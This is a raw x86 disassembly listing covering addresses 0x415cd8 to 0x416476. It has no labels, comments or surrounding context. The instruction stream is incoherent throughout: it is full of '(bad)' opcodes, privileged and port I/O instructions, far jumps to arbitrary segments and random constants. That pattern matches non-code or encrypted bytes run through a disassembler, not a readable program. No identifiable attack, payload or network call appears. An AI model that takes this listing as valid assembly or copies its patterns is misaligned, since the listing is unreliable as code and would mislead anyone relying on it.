  415cd8:	repz mov bh,0x57
  415cdb:	and    dl,BYTE PTR [edx+0x59]
  415cde:	dec    edi
  415cdf:	not    BYTE PTR [esi+eiz*1+0x19cc4721]
  415ce6:	into   
  415ce7:	popf   
  415ce8:	ret    0xc800
  415ceb:	icebp  
  415cec:	sbb    DWORD PTR [eax+0x46],esi
  415cef:	cmp    DWORD PTR [ecx+0x13],ebp
  415cf2:	lea    eax,[ecx-0x35]
  415cf5:	mov    ds:0x8b0861da,al
  415cfa:	js     0x415c9d
  415cfc:	cmc    
  415cfd:	cmp    BYTE PTR [edx],dh
  415cff:	mov    bl,BYTE PTR [eax+eax*4+0x1bba5537]
  415d06:	or     ch,BYTE PTR [esi]
  415d08:	push   0x42097d6
  415d0d:	pushf  
  415d0e:	push   ds
  415d0f:	sub    DWORD PTR [eax-0x2082e9fd],0xffffffa8
  415d16:	repz push eax
  415d18:	retf   0xc69d
  415d1b:	scas   al,BYTE PTR es:[edi]
  415d1c:	mov    eax,0x3e28a319
  415d21:	jmp    0x415cba
  415d23:	cwde   
  415d24:	(bad)  
  415d25:	(bad)  
  415d26:	push   esi
  415d27:	fsub   DWORD PTR [edx+edi*4+0x59036941]
  415d2f:	mov    es,edx
  415d31:	xor    eax,0xbe59563d
  415d36:	sub    ebp,DWORD PTR [edx-0x1]
  415d39:	stos   DWORD PTR es:[edi],eax
  415d3a:	push   ebp
  415d3b:	bound  edx,QWORD PTR [ebx]
  415d3d:	cmp    eax,0x231f8d82
  415d42:	push   ebx
  415d43:	mov    ss,ebx
  415d45:	scas   al,BYTE PTR es:[edi]
  415d46:	lods   eax,DWORD PTR ds:[esi]
  415d47:	in     al,0x4e
  415d49:	mov    edx,0x593e78e0
  415d4e:	(bad)
  415d51:	pop    edi
  415d52:	jo     0x415cf8
  415d54:	mov    BYTE PTR [esi],0x96
  415d57:	lods   eax,DWORD PTR ds:[esi]
  415d58:	test   DWORD PTR [esi+edx*4],0x6b56ada7
  415d5f:	fldcw  WORD PTR [eax-0x77f35415]
  415d65:	inc    esi
  415d66:	push   0x9
  415d68:	dec    edx
  415d69:	out    dx,eax
  415d6a:	repnz and al,0x4c
  415d6d:	mov    ebx,0x207a702c
  415d72:	les    eax,FWORD PTR [eax+0x6d]
  415d75:	fwait
  415d76:	ss adc eax,0x91e2355e
  415d7c:	(bad)  
  415d7d:	push   edx
  415d7e:	dec    edi
  415d7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415d80:	push   cs
  415d81:	ucomiss xmm7,DWORD PTR [edi-0x485d01a9]
  415d88:	scas   eax,DWORD PTR es:[edi]
  415d89:	mov    ?,WORD PTR [ebp-0x1c6d5694]
  415d8f:	cwde   
  415d90:	xchg   esp,eax
  415d91:	fwait
  415d92:	or     ebp,DWORD PTR [ecx]
  415d94:	pusha  
  415d95:	mov    ch,0x1f
  415d97:	ds dec esp
  415d99:	ins    BYTE PTR es:[edi],dx
  415d9a:	mov    ch,0x16
  415d9c:	mov    ds:0x985c3452,al
  415da1:	dec    edx
  415da2:	sahf   
  415da3:	xchg   edi,eax
  415da4:	xor    esp,0x93fcd323
  415daa:	jno    0x415d6d
  415dac:	mov    ah,0xe0
  415dae:	adc    BYTE PTR [ecx-0x3a445767],bh
  415db4:	mov    BYTE PTR [eax+eiz*8-0x46],dh
  415db8:	jle    0x415d51
  415dba:	sub    edx,DWORD PTR [edi]
  415dbc:	inc    esp
  415dbd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415dbe:	jno    0x415df2
  415dc0:	ja     0x415d7c
  415dc2:	jae    0x415e08
  415dc4:	or     DWORD PTR [edi+0x5f005fbb],eax
  415dca:	js     0x415e09
  415dcc:	sub    BYTE PTR [ebx+ebp*4+0x30],0x2f
  415dd1:	dec    ebx
  415dd2:	call   0x2b29:0x89aa03bf
  415dd9:	add    cl,al
  415ddb:	pop    ds
  415ddc:	popf   
  415ddd:	pusha  
  415dde:	into   
  415ddf:	mov    ds:0x2fc54bd6,al
  415de4:	cdq    
  415de5:	fld    QWORD PTR [edi+0x29092894]
  415deb:	jmp    0x8c89de3
  415df0:	lods   eax,DWORD PTR ds:[esi]
  415df1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415df2:	iret   
  415df3:	retf   0xcf9d
  415df6:	aam    0xb8
  415df8:	out    dx,eax
  415df9:	(bad)  
  415dfa:	pop    ds
  415dfb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415dfc:	(bad)  
  415dfd:	out    0xe9,eax
  415dff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415e00:	push   ebx
  415e01:	push   ebx
  415e02:	ror    DWORD PTR [ecx-0x5e56ac3f],0xf2
  415e09:	mov    esi,0x6c46a94
  415e0e:	pop    eax
  415e0f:	dec    esp
  415e10:	ins    DWORD PTR es:[edi],dx
  415e11:	cld    
  415e12:	mov    fs,WORD PTR [ebp-0x5157326]
  415e18:	fwait
  415e19:	not    DWORD PTR fs:[ebp-0x5403f7bb]
  415e20:	shl    edx,0xba
  415e23:	fsubp  st(3),st
  415e25:	repz sub DWORD PTR [ebx],ebx
  415e28:	icebp  
  415e29:	jns    0x415e9e
  415e2b:	xchg   DWORD PTR ds:0xfa702cf3,edx
  415e31:	in     al,dx
  415e32:	aam    0x56
  415e34:	lods   al,BYTE PTR ds:[esi]
  415e35:	nop
  415e36:	and    eax,0xb3da3cf4
  415e3b:	sbb    eax,0x55f14cee
  415e40:	sahf   
  415e41:	mov    dl,0xa6
  415e43:	cmp    BYTE PTR [edx-0x2ec8c3b],ah
  415e49:	mov    esp,0x51e17da5
  415e4e:	outs   dx,DWORD PTR ds:[esi]
  415e4f:	xor    DWORD PTR [ecx],ecx
  415e51:	sub    dl,BYTE PTR [ebx-0x5312c974]
  415e57:	xchg   ebp,eax
  415e58:	sub    eax,DWORD PTR [ebx+0x240a5c2b]
  415e5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415e5f:	xor    BYTE PTR [eax-0x7],bl
  415e62:	pop    es
  415e63:	pop    es
  415e64:	add    edi,ecx
  415e66:	xor    eax,0x6c4e2d8b
  415e6b:	scas   eax,DWORD PTR es:[edi]
  415e6c:	in     al,0xe6
  415e6e:	pop    ebx
  415e6f:	xchg   ebp,eax
  415e70:	inc    ebp
  415e71:	mov    ch,0x88
  415e73:	retf   0x995
  415e76:	cmp    BYTE PTR ds:0x56346402,bh
  415e7c:	mov    ah,0x46
  415e7e:	addr16 aam 0x8d
  415e81:	into   
  415e82:	in     al,0xa4
  415e84:	aam    0x43
  415e86:	lock jp 0x415ed4
  415e89:	leave  
  415e8a:	add    dl,BYTE PTR [edx]
  415e8c:	pop    ebx
  415e8d:	and    DWORD PTR [edi+0xcaade0d],0xffffff9a
  415e94:	jb     0x415efc
  415e96:	xor    ecx,edx
  415e98:	jmp    0xcfee4ebd
  415e9d:	jbe    0x415e41
  415e9f:	mov    al,0x27
  415ea1:	jmp    0x415e90
  415ea3:	push   esp
  415ea4:	push   eax
  415ea5:	sti    
  415ea6:	pop    es
  415ea7:	scas   al,BYTE PTR es:[edi]
  415ea8:	push   es
  415ea9:	jg     0x415e4d
  415eab:	shl    eax,0xce
  415eae:	jo     0x415e4d
  415eb0:	in     eax,dx
  415eb1:	jmp    0x7190:0xa0f275eb
  415eb8:	push   ebx
  415eb9:	and    cl,al
  415ebb:	jl     0x415f2e
  415ebd:	bound  ebx,QWORD PTR [ebx]
  415ebf:	sub    al,BYTE PTR [eax+0x2a4c5138]
  415ec5:	outs   dx,DWORD PTR ds:[esi]
  415ec6:	loopne 0x415f00
  415ec8:	arpl   ax,di
  415eca:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415ecc:	sub    DWORD PTR [eax-0x7c],ecx
  415ecf:	not    BYTE PTR [ecx-0x20]
  415ed2:	pop    edi
  415ed3:	add    bh,cl
  415ed5:	int3   
  415ed6:	cmp    edi,DWORD PTR [ecx+0x7c]
  415ed9:	or     eax,0x36c7b3b6
  415ede:	cmp    BYTE PTR [edi-0x61cdc19a],ch
  415ee4:	or     eax,0x9bf0ed5
  415ee9:	lods   eax,DWORD PTR ds:[esi]
  415eea:	ins    DWORD PTR es:[edi],dx
  415eeb:	enter  0xb1ed,0x5d
  415eef:	or     al,0xd3
  415ef1:	jge    0x415e76
  415ef3:	push   ss
  415ef4:	xchg   edi,eax
  415ef5:	add    BYTE PTR [edi-0x70],bh
  415ef8:	push   edi
  415ef9:	adc    dh,BYTE PTR [edx]
  415efb:	mov    ds:0x3b95c388,eax
  415f00:	and    DWORD PTR ds:0x5de860d3,esp
  415f06:	sub    DWORD PTR [eax+eiz*4],edx
  415f09:	jb     0x415f4e
  415f0b:	xlat   BYTE PTR ds:[ebx]
  415f0c:	inc    edi
  415f0d:	adc    BYTE PTR [eax+0x4e],cl
  415f10:	or     al,0x35
  415f12:	or     al,dl
  415f14:	push   esp
  415f15:	adc    eax,0x9bf63c86
  415f1a:	sbb    al,0x6b
  415f1c:	ins    DWORD PTR es:[edi],dx
  415f1d:	les    eax,FWORD PTR [ebx-0x59]
  415f20:	adc    eax,0xb96d12d7
  415f25:	rcl    ch,cl
  415f27:	inc    esp
  415f28:	ret    0xc57a
  415f2b:	xchg   ecx,eax
  415f2c:	jp     0x415ee5
  415f2e:	icebp  
  415f2f:	push   esi
  415f30:	aad    0x10
  415f32:	retf   0x26bf
  415f35:	push   esp
  415f36:	add    ecx,ebp
  415f38:	and    DWORD PTR [ecx+edi*1+0x4874d982],esi
  415f3f:	sbb    BYTE PTR [edi+0x38],bh
  415f42:	in     eax,0x67
  415f44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415f45:	jp     0x415f5d
  415f47:	push   esp
  415f48:	lds    ecx,FWORD PTR [ecx+0x66773dcf]
  415f4e:	push   ds
  415f4f:	mov    ds:0xf1b7efe2,al
  415f54:	xchg   edx,eax
  415f55:	jge    0x415f0f
  415f57:	iret   
  415f58:	hlt    
  415f59:	xor    ah,BYTE PTR [ebp-0x32]
  415f5c:	jle    0x415f62
  415f5e:	(bad)  
  415f61:	mov    cl,0xd5
  415f63:	or     bh,BYTE PTR [eax]
  415f65:	push   ebp
  415f66:	imul   ecx,ebx,0x58
  415f69:	lock inc edx
  415f6b:	test   DWORD PTR [ebx-0x4],ecx
  415f6e:	or     al,0x4a
  415f70:	imul   eax,DWORD PTR [ecx],0xffffffb0
  415f73:	cmp    BYTE PTR [ebp-0x71e3fa02],bl
  415f79:	js     0x415ff4
  415f7b:	pop    ecx
  415f7c:	inc    edx
  415f7d:	mov    edi,0xd190530b
  415f82:	fcom   DWORD PTR [ebx-0x39]
  415f85:	int    0xc
  415f87:	js     0x415fb4
  415f89:	adc    eax,0x18c9539b
  415f8e:	mov    ecx,0x7a60d2e4
  415f93:	jbe    0x415f43
  415f95:	out    0x74,al
  415f97:	xor    BYTE PTR [ecx],0xc7
  415f9a:	add    eax,0x70b944ac
  415f9f:	(bad)  
  415fa0:	and    bh,ah
  415fa2:	sbb    bl,bl
  415fa4:	mov    ss,WORD PTR [eax+esi*2]
  415fa7:	lods   eax,DWORD PTR ds:[esi]
  415fa8:	push   ds
  415fa9:	push   eax
  415faa:	int3   
  415fab:	cmp    eax,0xcd32c5fa
  415fb0:	gs cmp al,0x46
  415fb3:	repz clc 
  415fb5:	push   0xffffff83
  415fb7:	dec    esp
  415fb8:	pushf  
  415fb9:	dec    ebx
  415fba:	ret    
  415fbb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415fbc:	retf   0x538d
  415fbf:	pop    esp
  415fc0:	mov    ah,BYTE PTR [eax]
  415fc2:	outs   dx,BYTE PTR ds:[esi]
  415fc3:	adc    ebx,DWORD PTR [edx+esi*4-0x5]
  415fc7:	ds inc esp
  415fc9:	adc    eax,0xb03b452
  415fce:	or     eax,0x6d69b9e1
  415fd3:	out    0x90,eax
  415fd5:	sub    bh,BYTE PTR [ebx]
  415fd7:	jge    0x41604a
  415fd9:	ret    
  415fda:	mov    ch,bl
  415fdc:	shr    BYTE PTR [edi+0x65],0xb
  415fe0:	ficom  DWORD PTR [edi+0x457f4788]
  415fe6:	pop    eax
  415fe7:	retf   
  415fe8:	mov    eax,0x46b5e25a
  415fed:	mov    WORD PTR [eax],?
  415fef:	iret   
  415ff0:	jo     0x415fb8
  415ff2:	js     0x41606e
  415ff4:	adc    BYTE PTR [ebp+eiz*1+0x5c0b8868],0xd4
  415ffc:	(bad)  
  415ffd:	push   ebp
  415ffe:	fs xchg ebp,eax
  416000:	lock push cs
  416002:	aas    
  416003:	int    0x88
  416005:	int    0x9d
  416007:	jae    0x416078
  416009:	mov    ebx,0xc15e9531
  41600e:	aam    0x23
  416010:	popf   
  416011:	scas   eax,DWORD PTR es:[edi]
  416012:	popf   
  416013:	mov    edi,DWORD PTR [ebp+0x51]
  416016:	ja     0x41608d
  416018:	adc    DWORD PTR [edi+0x5b6be86e],0x21aefd9f
  416022:	push   ebx
  416023:	sub    al,BYTE PTR [ebx]
  416025:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416026:	xor    DWORD PTR [edx],eax
  416028:	add    dh,BYTE PTR [ebx+0x21f154aa]
  41602e:	loopne 0x416091
  416030:	mov    bh,0xbd
  416032:	imul   edi,DWORD PTR [ebx],0xffffffe6
  416035:	add    esp,edx
  416037:	xchg   DWORD PTR [edi],ebx
  416039:	jb     0x416061
  41603b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41603c:	jmp    0x4160aa
  41603e:	dec    eax
  41603f:	xchg   BYTE PTR [edx],dh
  416041:	scas   al,BYTE PTR es:[edi]
  416042:	xchg   BYTE PTR [ecx],dh
  416044:	push   edx
  416045:	cdq    
  416046:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416047:	xchg   edx,eax
  416048:	push   ss
  416049:	xor    ch,BYTE PTR [esi+0x2b]
  41604c:	je     0x4160c5
  41604e:	or     BYTE PTR [ecx+0x537b694f],cl
  416054:	push   0xffffffd3
  416056:	jae    0x416018
  416058:	cwde   
  416059:	or     dh,BYTE PTR [esi+0x39]
  41605c:	jbe    0x4160a6
  41605e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41605f:	outs   dx,DWORD PTR ds:[esi]
  416060:	pop    ds
  416061:	push   edi
  416062:	sub    eax,0xcb4386c9
  416067:	loop   0x415fea
  416069:	iret   
  41606a:	jnp    0x4160a8
  41606c:	cmp    al,0x9d
  41606e:	aaa    
  41606f:	jmp    0xa8b4a835
  416074:	es jbe 0x416084
  416077:	push   0xffffff89
  416079:	push   ebp
  41607a:	xchg   edx,eax
  41607b:	sbb    DWORD PTR [edi+0x1cf634f2],eax
  416081:	outs   dx,DWORD PTR ds:[esi]
  416082:	xchg   edi,eax
  416083:	xchg   ebx,eax
  416084:	daa    
  416085:	jecxz  0x4160fe
  416087:	leave  
  416088:	dec    ebx
  416089:	iret   
  41608a:	jbe    0x4160f1
  41608c:	sub    eax,0xc9ce6d2d
  416091:	mov    ebx,DWORD PTR [edi]
  416093:	ja     0x4160de
  416095:	nop
  416096:	dec    ebx
  416097:	sub    DWORD PTR [edx+0x14b40e5e],ebp
  41609d:	loop   0x4160c3
  41609f:	inc    edi
  4160a0:	mov    es,WORD PTR [eax+0x7b]
  4160a3:	fiadd  DWORD PTR [ecx-0xb]
  4160a6:	test   al,0x87
  4160a8:	shl    edi,1
  4160aa:	mov    esi,0xb1c3220d
  4160af:	stos   DWORD PTR es:[edi],eax
  4160b0:	xchg   ch,dh
  4160b2:	jbe    0x416111
  4160b4:	mov    esp,0xc17bca07
  4160b9:	mov    edi,0x805690bb
  4160be:	xchg   bl,ah
  4160c0:	dec    ebx
  4160c1:	pinsrw mm1,WORD PTR [ecx-0x4635dca8],0xab
  4160c9:	mov    esi,esp
  4160cb:	push   0x6ebebbe5
  4160d0:	cmp    edi,DWORD PTR [ebx+0x3b]
  4160d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4160d4:	into   
  4160d5:	lahf   
  4160d6:	je     0x416111
  4160d8:	add    edi,DWORD PTR [esi+ecx*2-0x1d]
  4160dc:	mov    cl,0x4
  4160de:	cmc    
  4160df:	and    eax,0x4a06c30f
  4160e4:	mov    al,ds:0x69655275
  4160e9:	adc    al,dh
  4160eb:	leave  
  4160ec:	leave  
  4160ed:	std    
  4160ee:	xor    BYTE PTR [ecx-0x33987fef],cl
  4160f4:	gs into 
  4160f6:	inc    ecx
  4160f7:	icebp  
  4160f8:	cdq    
  4160f9:	in     eax,dx
  4160fa:	push   eax
  4160fb:	mov    bl,BYTE PTR [ebx]
  4160fd:	xchg   BYTE PTR [ebp-0x5a],cl
  416100:	fadd   DWORD PTR [ebx]
  416102:	bound  ecx,QWORD PTR [edx]
  416104:	xchg   ebp,eax
  416105:	jg     0x41616d
  416107:	dec    edi
  416108:	mov    ch,0xd0
  41610a:	push   ebx
  41610b:	lods   eax,DWORD PTR ds:[esi]
  41610c:	fs sbb eax,0x7e551b53
  416112:	cmc    
  416113:	adc    BYTE PTR [esi-0x4],0xea
  416117:	mov    DWORD PTR [ebx],ecx
  416119:	xor    BYTE PTR [ebx-0x5fd69d42],cl
  41611f:	add    DWORD PTR [edi+eiz*4],ebx
  416122:	add    eax,0xb390442e
  416127:	cmp    al,0x58
  41612a:	adc    eax,0xe03edf76
  41612f:	xor    al,0x6c
  416131:	hlt    
  416132:	pushf  
  416133:	pop    ecx
  416134:	lds    ecx,FWORD PTR [ebp+0x372f6a4e]
  41613a:	fadd   DWORD PTR [esi+0x54ada22]
  416140:	adc    edx,esp
  416142:	xor    ebp,DWORD PTR [edi-0x7b]
  416145:	not    DWORD PTR ds:0xd10b20dd
  41614b:	jno    0x4161b0
  41614d:	dec    ecx
  41614e:	jnp    0x4161aa
  416150:	pusha  
  416151:	int    0xbb
  416153:	pop    ebx
  416154:	push   ebx
  416155:	pop    esi
  416156:	xor    BYTE PTR [esi],0xbb
  416159:	repz adc BYTE PTR [ebx+eax*4],cl
  41615d:	cs repnz hlt 
  416160:	cmp    cl,BYTE PTR [ebx]
  416162:	loop   0x4161e0
  416164:	inc    ecx
  416165:	or     eax,0xde049923
  41616a:	mov    ds:0x468dfd97,eax
  41616f:	push   ecx
  416170:	push   eax
  416171:	add    cl,cl
  416173:	cmp    ebx,DWORD PTR [esp+ebp*8-0x2d16526e]
  41617a:	add    ebp,edi
  41617c:	jl     0x416154
  41617e:	out    0x10,al
  416180:	fadd   DWORD PTR [ebx+0x64ee1457]
  416186:	jg     0x4161b2
  416188:	fsubr  DWORD PTR [ecx+0x40893b94]
  41618e:	dec    ebp
  41618f:	retf   0x9a9d
  416192:	push   edi
  416193:	jecxz  0x4161e4
  416195:	mov    eax,0xae908039
  41619a:	mov    ebp,0x7611c7ed
  41619f:	in     eax,dx
  4161a0:	lock adc BYTE PTR gs:[edx],bh
  4161a4:	ins    BYTE PTR es:[edi],dx
  4161a5:	fidivr WORD PTR [edi-0x37]
  4161a8:	jne    0x4161dc
  4161aa:	jl     0x41612c
  4161ac:	int    0x5
  4161ae:	ja     0x4161dc
  4161b0:	repnz mov ch,0xb2
  4161b3:	xchg   edi,eax
  4161b4:	adc    al,BYTE PTR [esi-0x37c379b0]
  4161ba:	test   DWORD PTR [esi+0x30],esi
  4161bd:	inc    ebp
  4161be:	(bad)
  4161c3:	jmp    0xafa31fb3
  4161c8:	dec    esp
  4161c9:	mov    bl,al
  4161cb:	or     bh,0x33
  4161ce:	les    ecx,FWORD PTR [ecx+0x41]
  4161d1:	aam    0x68
  4161d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4161d4:	adc    ch,BYTE PTR [edi]
  4161d6:	adc    esi,0xfffffffd
  4161d9:	push   ecx
  4161da:	out    dx,al
  4161db:	stos   DWORD PTR es:[edi],eax
  4161dc:	int3   
  4161dd:	ds dec edx
  4161df:	pop    edi
  4161e0:	aam    0x7c
  4161e2:	mov    edi,0xbc4cf592
  4161e7:	shl    BYTE PTR gs:[edx-0x3f],cl
  4161eb:	pop    edi
  4161ec:	(bad)  
  4161ed:	xor    al,0xbd
  4161ef:	invd   
  4161f1:	jp     0x416173
  4161f3:	aad    0xa2
  4161f5:	xchg   ebp,eax
  4161f6:	std    
  4161f7:	push   cs
  4161f8:	in     eax,0x89
  4161fa:	cmc    
  4161fb:	ss daa 
  4161fd:	ja     0x41620e
  4161ff:	dec    BYTE PTR [ecx+ebx*8-0x52]
  416203:	lock pop edx
  416205:	psubd  xmm0,XMMWORD PTR [edx+0x78]
  41620a:	lods   eax,DWORD PTR ds:[esi]
  41620b:	fs inc edx
  41620d:	out    0xa3,al
  41620f:	jnp    0x416290
  416211:	out    dx,eax
  416212:	xlat   BYTE PTR ds:[ebx]
  416213:	inc    edi
  416214:	jle    0x4161b7
  416216:	les    edi,FWORD PTR [ecx+0x56]
  416219:	mov    esp,DWORD PTR [edx+0x6f250e7c]
  41621f:	daa    
  416220:	and    eax,0x9a814bcf
  416225:	in     eax,0x70
  416227:	pop    edi
  416228:	dec    ebp
  416229:	add    eax,0x5bc4cb24
  41622e:	outs   dx,BYTE PTR ds:[esi]
  41622f:	sbb    edx,DWORD PTR [eax-0xe]
  416232:	dec    di
  416234:	inc    edi
  416235:	cmp    eax,DWORD PTR [edi]
  416237:	out    0xd1,eax
  416239:	out    0x92,al
  41623b:	mov    BYTE PTR [edx+0x4b],ch
  41623e:	imul   ebx,ebx,0x7ed38bb5
  416244:	pop    esp
  416245:	mov    WORD PTR ds:0xff87d67d,cs
  41624b:	pusha  
  41624c:	fisub  WORD PTR [ebx]
  41624e:	mov    dh,0x93
  416250:	pop    esp
  416251:	mov    ebx,0x7952e536
  416256:	shl    DWORD PTR [eax-0x21],cl
  416259:	sbb    eax,0xf2bcde93
  41625e:	pusha  
  41625f:	cmp    eax,0x312d8efd
  416264:	or     BYTE PTR [edi],bl
  416266:	push   edi
  416267:	cmp    dh,BYTE PTR fs:[eax-0x2a]
  41626b:	ret    
  41626c:	sbb    eax,0xf0818456
  416271:	jne    0x41625f
  416273:	call   0xd855:0x2e60068f
  41627a:	int3   
  41627b:	call   0x7166:0x3fbbca6e
  416282:	fdivr  QWORD PTR [edi-0x4b010e78]
  416288:	shl    DWORD PTR [ecx+0x4c],cl
  41628b:	ja     0x416282
  41628d:	loopne 0x4162ba
  41628f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416290:	aam    0xe6
  416292:	into   
  416293:	fdiv   QWORD PTR [ebp-0x45]
  416296:	mov    ebp,0x2160ad7
  41629b:	mov    esi,0xaec6df75
  4162a0:	inc    ebp
  4162a1:	aas    
  4162a2:	mov    esp,0x595db595
  4162a7:	imul   esi,DWORD PTR [ebp-0x7],0xffffffe0
  4162ab:	popf   
  4162ac:	push   ecx
  4162ad:	enter  0x4451,0x3
  4162b1:	cmpxchg DWORD PTR [ecx+0x44bc0dce],edx
  4162b8:	cmp    DWORD PTR [ebp+0x51],edi
  4162bb:	pop    edx
  4162bc:	and    DWORD PTR [edi+ecx*2-0x72],edi
  4162c0:	je     0x4162c9
  4162c2:	inc    esp
  4162c3:	clc    
  4162c4:	cmp    BYTE PTR [edi],dh
  4162c6:	enter  0x9e12,0x9b
  4162ca:	jne    0x416317
  4162cc:	sub    BYTE PTR [ebx-0x36],bl
  4162cf:	mov    BYTE PTR [ebx+0xcfd2657],ah
  4162d5:	jne    0x416311
  4162d7:	push   0xd3f8281d
  4162dc:	fs ja  0x4162a3
  4162df:	sub    ebx,DWORD PTR [esi+eax*8]
  4162e2:	mov    ecx,0x7ed59177
  4162e7:	fsubr  DWORD PTR [ecx+0x48]
  4162ea:	ss push ss
  4162ec:	dec    esp
  4162ed:	cmp    ch,0x29
  4162f0:	rcl    BYTE PTR [ebp+0x53ad4a16],0xfd
  4162f7:	loop   0x41632c
  4162f9:	daa    
  4162fa:	xchg   ebx,eax
  4162fb:	fcmove st,st(6)
  4162fd:	mov    al,0xb0
  4162ff:	mov    edi,0x6e1fae6
  416304:	icebp  
  416305:	push   ebp
  416306:	int    0x7e
  416308:	adc    eax,0x89837041
  41630d:	cs cld 
  41630f:	inc    ebp
  416310:	pusha  
  416311:	(bad)  
  416313:	or     DWORD PTR [ebx-0x44],0x65
  416317:	in     al,dx
  416318:	inc    esp
  416319:	out    0x80,al
  41631b:	adc    DWORD PTR [edx-0x3343fbb8],edi
  416321:	cmp    edx,edi
  416323:	jl     0x41632e
  416325:	mov    edx,edi
  416327:	adc    edx,DWORD PTR [ebx]
  416329:	adc    DWORD PTR [edi],esp
  41632b:	inc    ecx
  41632c:	retf   0x2a92
  41632f:	adc    ah,dh
  416331:	(bad)  
  416333:	sbb    BYTE PTR [ebp*8-0x2c427cfd],dl
  41633a:	int3   
  41633b:	mov    eax,0x87e23830
  416340:	mov    cl,0x6e
  416342:	adc    eax,0x65a02b70
  416347:	xchg   edi,eax
  416348:	xchg   esi,eax
  416349:	sub    edx,DWORD PTR [esi+esi*2+0x2e]
  41634d:	xchg   ebp,eax
  41634e:	lahf   
  41634f:	xchg   esp,eax
  416350:	inc    ebp
  416351:	adc    eax,0xf189e80b
  416356:	sbb    edx,edi
  416358:	xor    ecx,DWORD PTR [eax]
  41635a:	pop    eax
  41635b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41635c:	(bad)
  416360:	aam    0xc5
  416362:	sti    
  416363:	inc    ecx
  416364:	lea    esi,[ebp+ebp*1+0x35]
  416368:	clc    
  416369:	je     0x416303
  41636b:	push   edi
  41636c:	add    BYTE PTR [eax],bh
  41636e:	cld    
  41636f:	jo     0x416344
  416371:	mov    ch,0x52
  416373:	ins    BYTE PTR es:[edi],dx
  416374:	ja     0x4163f4
  416376:	jmp    0xec38ed68
  41637b:	stc    
  41637c:	and    al,0x54
  41637e:	dec    ecx
  41637f:	sbb    BYTE PTR [ebx+0x11],al
  416382:	jmp    0x4163f0
  416384:	jns    0x41638a
  416386:	sbb    cl,dh
  416388:	add    ebp,DWORD PTR [esi+ecx*2-0x691cfdef]
  41638f:	mov    ebx,0x3b0c6e97
  416394:	bound  ecx,QWORD PTR [ebx+0x3b]
  416397:	dec    ecx
  416398:	pusha  
  416399:	pop    es
  41639a:	outs   dx,DWORD PTR ds:[esi]
  41639b:	(bad)  [eax]
  41639d:	ins    BYTE PTR es:[edi],dx
  41639e:	cld    
  41639f:	dec    esp
  4163a0:	dec    ebp
  4163a1:	or     BYTE PTR [edi+0x6c],dh
  4163a4:	(bad)  
  4163a5:	dec    ebp
  4163a6:	hlt    
  4163a7:	jge    0x41633f
  4163a9:	jmp    0x416337
  4163ab:	pop    ss
  4163ac:	push   ss
  4163ad:	push   ebp
  4163ae:	cli    
  4163af:	fnsave [esi]
  4163b1:	push   ss
  4163b2:	int3   
  4163b3:	lds    eax,FWORD PTR [ebx+0x72a02016]
  4163b9:	mov    esp,DWORD PTR [edi+0x3df092]
  4163bf:	aad    0xe
  4163c1:	sbb    ebx,DWORD PTR [esi]
  4163c3:	add    al,0x98
  4163c5:	lea    ebp,[ebx+0x3bf9f3e2]
  4163cb:	cmp    DWORD PTR [edi+edx*1+0x60],edi
  4163cf:	les    edx,FWORD PTR [ecx]
  4163d1:	fcomip st,st(6)
  4163d3:	daa    
  4163d4:	rcl    DWORD PTR [eax+eax*2+0x42fe2596],0x0
  4163dc:	mov    ah,0xc5
  4163de:	cli    
  4163df:	xor    BYTE PTR [ebx],0xe4
  4163e2:	pop    esi
  4163e3:	imul   esi,DWORD PTR [edi-0x4ed1fc3a],0x7e
  4163ea:	js     0x416462
  4163ec:	pop    ss
  4163ed:	mov    dl,0xdc
  4163ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4163f0:	inc    edi
  4163f1:	inc    esp
  4163f2:	lock hlt 
  4163f4:	sti    
  4163f5:	imul   edi,ebx,0xa
  4163f8:	jmp    0x6090ed1e
  4163fd:	mov    bh,0x9c
  4163ff:	into   
  416400:	jle    0x41642e
  416402:	sub    DWORD PTR [ebx],ebx
  416404:	sub    al,0xb4
  416406:	or     DWORD PTR ds:0xe64df1b3,0x87da3c98
  416410:	or     dl,BYTE PTR [ebx+0x74]
  416413:	mov    edx,0x272447fe
  416418:	adc    al,0xf1
  41641a:	ror    dl,1
  41641c:	mov    cl,0x65
  41641e:	les    ecx,FWORD PTR [ebx+0x66]
  416421:	add    eax,DWORD PTR [esi]
  416423:	lods   eax,DWORD PTR ds:[esi]
  416424:	rcl    al,0xca
  416427:	cmp    al,0xac
  416429:	xor    DWORD PTR [edx-0x56],0xef63544c
  416430:	bound  esi,QWORD PTR [edi-0x52252c25]
  416436:	xor    ah,BYTE PTR [edx-0x50]
  416439:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41643a:	mov    edi,0x1b94d4f1
  41643f:	xor    eax,0x789a3c6d
  416444:	inc    ebx
  416445:	push   0x73
  416447:	aam    0xe2
  416449:	test   BYTE PTR [esi],dh
  41644b:	repnz push ebx
  41644d:	mov    bh,0xf7
  41644f:	ret    0xa41d
  416452:	mov    ebp,0xcee08b1f
  416457:	pop    esi
  416458:	jns    0x416438
  41645a:	push   ds
  41645b:	sbb    edi,esi
  41645d:	sahf   
  41645e:	push   esp
  41645f:	xor    al,0xc0
  416461:	repz xchg esi,eax
  416463:	outs   dx,DWORD PTR gs:[esi]
  416465:	and    DWORD PTR [edi-0x22d7a7e0],ebp
  41646b:	add    esi,0xcb63b151
  416471:	xchg   esi,eax
  416472:	ins    DWORD PTR es:[edi],dx
  416473:	mov    ah,0xd0
  416475:	ins    BYTE PTR es:[edi],dx
  416476:	ss inc edi
